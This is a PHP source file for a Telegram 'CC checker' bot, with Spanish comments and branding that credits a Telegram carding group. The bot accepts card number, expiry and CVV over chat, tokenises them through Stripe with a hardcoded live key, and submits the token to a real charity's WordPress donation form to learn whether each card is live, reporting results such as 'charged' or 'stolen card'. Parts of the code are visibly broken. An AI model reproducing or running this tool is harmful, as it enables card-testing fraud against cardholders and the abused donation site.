<?php

#=======[Bot CC Checker by BAMBI 🐝]=======#


#https://api.telegram.org/bot<TOKEN>/setwebhook?url=<URL>/kloe.php

$token = '<OBLIGATORIO>'; #BOT TOKEN AQUÍ
$website = 'https://api.telegram.org/bot'.$token;

$input = file_get_contents('php://input');
$update = json_decode($input, TRUE);

$bmatId = $update['message']['chat']['id'];
$message = $update['message']['text'];
$messageId = $update['message']['message_id'];
$username = $update['message']['from']['username'];
$userId = $update['message']['from']['id'];
$firstname = $update['message']['from']['first_name'];
$lastname = $update['message']['from']['last_name'];

$usuario = "<OBLIGATORIO>"; #Aquí su ID

$tunombre = "<OBLIGATORIO>"; #Aquí el nombre con el cual quiere que el bot se dirija a usted

if($lastname == false){
  $secondname = "No tiene";
}else{
  $secondname = "$lastname";
}

if(strpos($message, "/start") === 0){sendMessage($bmatId, "<b>Kloe ✅ 🇨🇴</b>");
}

elseif(strpos($message, "/pass") === 0){sendMessage($bmatId, "Verificando... Por favor espere.");

$correcta = "<OBLIGATORIO>"; #Aquí su contraseña

$reporte = "$usuario";

$contraseña = substr($message, 5);

if($contraseña == false){sendMessage($bmatId, "Ningún dato ingresado");
}

if($correcta == $contraseña){sendMessage($bmatId, "Contraseña Correcta ✅");
}

if($correcta != $contraseña && $contraseña == true){sendMessage($bmatId, "Contraseña Incorrecta ❌");
}

if($correcta == $contraseña && $userId == $usuario){sendMessage($bmatId, "<b>Hola $tunombre, aquí están mis comandos</b>

<b>✘</b> Checkear CC = <code>/k cc|mm|yy|cvv</code>


<b>✘</b> Enviar Mensaje = <code>/msj tu mensaje-id</code>


[⚠️] Para enviar un mensaje, el receptor debe haber usado mínimo el comando <code>/start</code> en su bot, también debe de conocer su ID, es decir, el ID del receptor.");
}

if($contraseña == $correcta && $userId != $usuario){sendMessage($bmatId, "No eres $tunombre, ¡largate cucaracha!");
}

if($userId != $usuario && $contraseña == $correcta){sendMessage($reporte, "Alguien a ingresado la contraseña correcta, y no eres tú, pero no te preocupes, no dejaré que me use, aquí están los datos de ese usuario:
  
[🐝] Username = @$username

[🐝] Primer Nombre = <code>$firstname</code>

[🐝] Segundo Nombre = <code>$secondname</code>

[🐝] Su ID = <code>$userId</code>


Enviale un mensaje usando <code>/msj tu mensaje-id</code>");
}

}

elseif(strpos($message, "/msj") === 0){
  
  $mensaje = substr($message, 5);
  $s = explode("-", $mensaje);
  $msj = $s[0];
  $id = $s[1];
  
sendMessage($id, "$msj");

sendMessage($bmatId, "Datos del mensaje

[🐝] Mensaje = <code>$msj</code>

[🐝] Id = <code>$id</code>");
}

elseif(strpos($message, "/k") === 0){
  
if($bmatId != $usuario && $contraseña == $correcta){
  sendMessage($bmatId, "<code>Acceso denegado, 🖕 esta va para ti y BTS xd</code>");
  return true;
}
  
$tarjeta = substr($message, 3);
$l = explode("|", $tarjeta);
$num = $l[0];
$fmes = $l[1];
$faño = $l[2];
$cvv = $l[3];

$name = rand('a, z');
$lastn = rand('a, z');
$email = rand("bambixkloe");
$email2 = rand("gmail.com", "outlook.com", "yahoo.com", "proton.com", "zoho.com");
$zip = rand(10001, 90045);
$otro = rand(0, 999999);

$bm = curl_init();
curl_setopt($bm, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($bm, CURLOPT_USERAGENT, $SERVER['HTTPS_USER_AGENT']);
curl_setopt($bm, CURLOPT_HEADER, 0);
curl_setopt($bm, CURLOPT_HTTPSHEADER, array(
  'Host: api.stripe.com',
  'accept: application/json',
  'accept-language: es-US,es-419;q=0.9,es;q=0.8,en;q=0.7,ko;q=0.6,ca;q=0.5',
  'accept-encoding: gzip, deflate, br',
  'save-data: on',
  'user-agent: Mozilla/5.0 (Linux; Android 11; SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
  'origin: https://js.stripe.com',
  'referer: https://js.stripe.com/',
  'sec-fetch-site: same-site',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  ));
  curl_setopt($bm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($bm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($bm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_POSTFIELDS, 'card[number]='.$tarjeta.'&card[cvc]='.$cvv.'&card[exp_month]='.$fmes.'&card[exp_year]='.$faño.'&card[address_zip]='.$zip.'&guid=86efcb32-d58d-4b49-9b8f-56f39740a69366f4cc&muid=26bfc9a6-95cf-4a8b-9d30-a28c32fc1c3ed66715&sid=a06269c5-4777-4903-a0ec-3b6ef9761ab503fd38&payment_user_agent=stripe.js%2Ffb918da46%3B+stripe-js-v3%2Ffb918da46&time_on_page=246715&key=pk_live_QB3JHShzr4COf43YQwKnPqIV00mCe1EXuH&pasted_fields=number');

$bambi1 = curl_exec($bm);
curl_close($bm);

$bm = curl_init();
curl_setopt($bm, CURLOPT_URL, 'https://www.marbellahybrid.com/wp-admin/admin-ajax.php');
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_USERAGENT, $SERVER['HTTPS_USER_AGENT']);
curl_setopt($bm, CURLOPT_HEADER, 0);
curl_setopt($bm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($bm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($bm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($bm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($bm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($bm, CURLOPT_HTTPSHEADER, array(
  'Host: www.marbellahybrid.com',
  'accept: application/json, text/javascript, */*; q=0.01',
  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
  'accept-encoding: gzip, deflate, br',
  'accept-language: es-US,es-419;q=0.9,es;q=0.8,en;q=0.7,ko;q=0.6,ca;q=0.5',
  'user-agent: Mozilla/5.0 (Linux; Android 11; SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
  'x-requested-with: XMLHttpRequest',
  'save-data: on',
  'origin: https://www.marbellahybrid.com',
  'referer: https://www.marbellahybrid.com/donate/',
  'sec-fetch-site: same-origin',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  ));
curl_setopt($bm, CURLOPT_POSTFIELDS, 'action=formcraft3_form_submit&field7=&field1%5B%5D=Bambi&field2%5B%5D=Kloe&field3=its8019e%40gmail.com&field17%5B%5D=2&field16=&field12=2&stripe-coupon=&stripe_token=tok_1K46FQEn17G9YKmhMK0BlsfN&website=&id=9&location=https%3A%2F%2Fwww.marbellahybrid.com%2Fdonate%2F&emails=&hidden=&redirect=&type=all&triggerIntegration=undefined&fieldLabels=undefined&formcraft3_wpnonce=undefined');

$bambi2 = curl_exec($bm);
curl_close($bm);

if ((strpos($bambi2, "https://www.marbellahybrid.com/donate/thank_you?donation_number="))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Donación exitosa (charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }

elseif ((strpos($bambi2, '"Your card was declined."'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Tarjeta Declinada [❌]

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'Your card has insufficient funds.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Fondos Insuficientes [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
 elseif ((strpos($bambi2, "Your card's security code is incorrect"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Código de Seguridad (CVV) Incorrecto [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'insufficient_funds'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Fondos Insuficientes [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
 elseif ((strpos($bambi2, '"cvc_check": "pass"'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ cvc_check pass (charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'Thank you.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Thank You (Charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, '"status": "succeeded"'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Status Succeeded (charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "Thank You For Donation."))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔  [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "Your payment has already been processed"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Pago Procesado (charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "Success"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Success (charged) [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "incorrect_cvc"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Código de Seguridad (CVV) Incorrecto [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "The card's security code is incorrect."))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Código de Seguridad (CVV) Incorrecto [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "Your card does not support thus type of purchase"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ La Tarjeta no Soporta Este Tipo de Compra [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "transaction_not_allowed"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ La tarjeta no soporta este tipo de compra [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "do_not_honor"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Do not honor [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "stolen_card"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Stolen card [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "lost_card"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Lost card [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "pickup_card"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Fondos Insuficientes [✅]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'Your card number is incorrect.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Número de tarjeta incorrecto [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }

elseif ((strpos($bambi2, 'The card number is incorrect.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Número de tarjeta incorrecto [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'incorrect_number'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Número de tarjeta incorrecto [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, 'Your card has expired.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ La tarjeta a expirado [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
}

elseif ((strpos($bambi2, 'expired_card.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ La tarjeta a expirado [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }

elseif ((strpos($bambi2, 'The card was declined.'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Tarjeta Declinada [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, "generic_declined"))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Tarjeta Declinadad (generic) [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, '"cvc_check": "unavailable"'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ cvc check unavailable [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, '"cvc_check": "unchecked"'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ cvc check unchecked [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }
 
elseif ((strpos($bambi2, '-1'))){
  sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Actualize (Fatal Error) [❌]
  

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
 }else{sendMessage($bmatId, "
Tarjeta ➜ <code>$tarjeta</code>

Respuesta ➔ Actualize (Fatal Error) [❌]

MSJ: A ocurrido un error, verifique los responses, este error se puede dar porque no está regustrada la respuesta, la api expiró, o los proxys no funcionan etc...


Resultado [1] = $bambi1

Resultado [2] = $bambi2

Usuario ➜ @$username
Bot By ➜ @B4MB1T
Grupo ➜ @LoremChecker");
}
 
  }


#Funcion
function sendMessage($bmatId, $response) {
    $url = $GLOBALS['website'].'/sendMessage?chat_id='.$bmatId.'&parse_mode=HTML&text='.urlencode($response);
    file_get_contents($url);
}



#=======[Bot CC Checker by BAMBI 🐝]=======#

?>